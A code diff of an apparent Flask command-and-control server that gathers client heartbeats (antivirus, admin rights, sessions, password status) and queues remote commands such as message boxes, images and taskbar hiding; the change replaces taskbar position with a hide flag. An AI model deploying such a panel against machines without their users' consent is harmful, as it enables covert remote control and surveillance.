@@ -47,8 +47,7 @@ def heartbeat():
             "user_sessions": system_info.get('user_sessions', []),
             "has_password": system_info.get('has_password', False),
             "current_background_image": system_info.get('current_background_image', None),
-            "taskbar_autohide": system_info.get('taskbar_autohide', False),
-            "taskbar_position": system_info.get('taskbar_position', 'bottom')
+            "taskbar_hidden": system_info.get('taskbar_hidden', False)
         }
         print(f"Heartbeat from {client_id} (IP: {ip}). CPU: {system_info.get('cpu')}%. Memory: {system_info.get('memory_percent')}%. Uptime: {system_info.get('uptime')}. Antivirus: {system_info.get('antivirus')}. Admin: {system_info.get('is_admin')}. Clients online: {len(connected_clients)}")
         if system_info.get('current_background_image'):
@@ -73,12 +72,12 @@ def send_command():
     image_type = data.get("image_type", "") # New: Get image_type, default empty string
     filters = data.get("filters", None) # New: Get filters, default None
     actions = data.get("actions", None) # Get drawing actions
-    position = data.get("position", None) # Get taskbar position
+    hide = data.get("hide", None) # Get taskbar hide status
 
     if client_id and cmd:
         # Store all relevant command data including monitor_index and image
-        client_commands[client_id] = {"cmd": cmd, "title": title, "message": message, "icon": icon, "buttons": buttons, "topmost": topmost, "monitor_index": monitor_index, "image": image, "pid": pid, "image_type": image_type, "filters": filters, "actions": actions, "position": position}
-        print(f"Command '{cmd}' for client {client_id} (Title: '{title}', Message: '{message}', Icon: '{icon}', Buttons: '{buttons}', Top Most: {topmost}, Monitor Index: {monitor_index}, Image: {image is not None}, Image Type: {image_type}, Filters: {filters}) received.")
+        client_commands[client_id] = {"cmd": cmd, "title": title, "message": message, "icon": icon, "buttons": buttons, "topmost": topmost, "monitor_index": monitor_index, "image": image, "pid": pid, "image_type": image_type, "filters": filters, "actions": actions, "hide": hide}
+        print(f"Command '{cmd}' for client {client_id} (Hide: {hide}) received.")
         return jsonify({"status": "success", "message": "Command received"}), 200
     print(f"Invalid command data received: {data}")
     return jsonify({"status": "error", "message": "Invalid command data"}), 400
